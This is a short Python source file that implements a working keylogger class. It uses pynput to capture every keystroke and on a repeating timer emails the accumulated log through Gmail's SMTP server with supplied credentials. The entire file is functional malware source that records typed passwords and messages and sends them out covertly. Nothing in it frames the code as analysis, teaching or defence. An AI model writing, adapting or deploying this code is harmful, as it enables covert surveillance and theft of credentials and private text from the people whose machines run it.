#!/usr/bin/env python
import smtplib
import pynput.keyboard
import threading
class keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        self.log = self.log + string
    def process_key_press(self, c_key):
        try:
            cur_key = str(c_key.char)
        except AttributeError:
            if c_key == c_key.space:
                cur_key = " "
            else:
                cur_key = " " + str(c_key) + " "
        self.append_to_log(cur_key)
    def report(self):
        self.send_mail(self.email, self.password, "\n\n"+self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()